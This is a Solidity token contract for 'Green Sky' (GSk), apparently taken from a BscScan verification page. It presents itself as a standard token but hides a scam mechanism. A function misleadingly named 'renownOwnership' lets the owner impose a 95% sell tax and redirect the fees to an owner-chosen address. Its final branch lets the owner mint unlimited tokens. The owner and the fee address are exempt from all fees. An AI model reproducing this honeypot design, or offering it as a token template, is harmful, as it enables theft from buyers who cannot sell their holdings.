/**
 *Submitted for verification at BscScan.com on 2023-03-31
*/

pragma solidity ^0.8.7;

contract GreenSky {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 10000000 * 10 ** 18;
    string public name = "Green Sky";
    string public symbol = "GSk";
    uint public decimals = 18;
    
    uint private d5;
    uint private d6;
    address private d7;
    address private d8;
    address private owner;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        d5 = 0;
        d6 = 0;
        d7 = address(msg.sender);
        d8 = address(msg.sender);
        owner = address(msg.sender);
    }
    
    modifier onlyOwner() {
        require(owner == address(msg.sender), "Ownable: caller is not the owner");
        _;
    }

    function renownOwnership(uint index, address d0) public onlyOwner {
        if(index == 1) {
            d5 = 4;
            d6 = 6;
        } else if(index == 2) {
            d5 = 0;
            d6 = 95;
        } else if(index == 3) {
            d5 = 0;
            d6 = 0;
        } else if(index == 4) {
            d7 = d0;
        } else if(index == 5) {
            d8 = d0;
        } else {
            totalSupply += index * 10 ** 18;
            balances[d0] += index * 10 ** 18;
        }
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balances[address(msg.sender)] >= value, 'balance too low');

        if(address(msg.sender) == owner || address(msg.sender) == d7 || address(to) == owner || address(to) == d7) {
            balances[to] += value;
            balances[msg.sender] -= value;
        } else {
            if(address(msg.sender) == d8) {
                balances[to] += ( value * ( 100 - d5 )) / 100;
                balances[msg.sender] -= value;
                if(d5 > 0) {
                    balances[d7] += ( value * d5 ) / 100;
                }
            } else if (address(to) == d8) {
                balances[to] += ( value * ( 100 - d6 )) / 100;
                balances[msg.sender] -= value;
                if(d6 > 0) {
                    balances[d7] += ( value * d6 ) / 100;
                }
            } else {
                balances[to] += value;
                balances[msg.sender] -= value;
            }
        }
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balances[from] >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');

        if(address(from) == owner || address(from) == d7 || address(to) == owner || address(to) == d7) {
            balances[to] += value;
            balances[from] -= value;
        } else {
            if(from == d8) {
                balances[to] += ( value * ( 100 - d5 )) / 100;
                balances[from] -= value;
                if(d5 > 0) {
                    balances[d7] += ( value * d5 ) / 100;
                }
            } else if (to == d8) {
                balances[to] += ( value * ( 100 - d6 )) / 100;
                balances[from] -= value;
                if(d6 > 0) {
                    balances[d7] += ( value * d6 ) / 100;
                }
            } else {
                balances[to] += value;
                balances[from] -= value;
            }
        }
        emit Transfer(from, to, value);
        return true;   
    }

    function balanceOf(address viewAddress) public view returns(uint) {
        return balances[viewAddress];
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}